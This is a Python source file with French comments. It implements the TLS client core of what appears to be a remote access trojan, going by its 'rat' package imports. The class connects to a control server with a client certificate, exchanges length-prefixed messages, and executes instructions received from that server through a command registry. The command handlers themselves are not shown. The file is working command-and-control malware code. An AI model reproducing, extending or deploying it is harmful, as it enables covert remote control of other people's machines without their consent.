# Ce module implémente un client SSL générique.
# Il gère la connexion sécurisée vers un serveur distant,
# l’envoi/réception de messages avec un protocole length-prefixed,
# et l’exécution de commandes via un registre de commandes (CommandRegistry).
# Il sert de cœur d’un agent qui reçoit et exécute des instructions.

import socket
import ssl
from rat.utils.logger import setup_logger
from rat.commands.command_registry import CommandRegistry


logger = setup_logger()


class SSLClient:

    def __init__(
        self,
        server_host,
        server_port,
        sni_hostname,
        client_cert,
        client_key,
    ):

        # Adresse du serveur de contrôle
        self.server_host = server_host
        self.server_port = server_port

        # Nom SNI (utile pour TLS, même si pas utilisé directement ici)
        self.sni_hostname = sni_hostname

        # Contexte SSL pour établir une connexion sécurisée
        self._context = ssl.SSLContext()

        # Chargement du certificat client pour authentification mutuelle
        self._context.load_cert_chain(client_cert, client_key)

        # Socket TCP brut
        self._sock = None

        # Socket SSL encapsulé
        self._ssock = None

        # Registre des commandes exécutables par le client
        self.registry = CommandRegistry(self)

    def close(self):

        # Ferme proprement la connexion SSL et TCP
        if self._ssock:
            self._ssock.close()

        if self._sock:
            self._sock.close()

    def connect(self):

        # Création du socket TCP
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Encapsulation dans SSL
        self._ssock = self._context.wrap_socket(self._sock)

        # Connexion au serveur distant
        self._ssock.connect((self.server_host, self.server_port))

    def send(self, msg):

        # Envoi d’un message avec protocole length-prefixed :
        # [taille]\n[data]
        data = msg.encode()

        size = str(len(data)).encode() + b"\n"

        self._ssock.sendall(size)
        self._ssock.sendall(data)

    def receive(self):

        # Lecture du header contenant la taille du message
        size_data = b""

        while not size_data.endswith(b"\n"):
            chunk = self._ssock.recv(1)

            if not chunk:
                return None

            size_data += chunk

        try:
            size = int(size_data.strip())
        except ValueError:
            return None

        # Lecture du payload complet selon la taille annoncée
        buffer = b""

        while len(buffer) < size:
            chunk = self._ssock.recv(min(4096, size - len(buffer)))

            if not chunk:
                return None

            buffer += chunk

        return buffer.decode(errors="ignore")

    def execute_command(self, command: str) -> str:

        # Nettoyage de la commande reçue
        command = command.strip()

        if not command:
            return "Empty command"

        # Commande spéciale de sortie propre
        if command == "exit":
            logger.info("Exit command received")

            self.close()

            import sys

            sys.exit(0)

        # Parsing : nom + arguments
        parts = command.split(" ", 1)
        cmd_name = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        # Recherche du handler dans le registry
        handler = self.registry.get(cmd_name)

        # Exécution si trouvé, sinon fallback
        if handler:
            return handler.execute(args)
        else:
            return "Command not implemented"
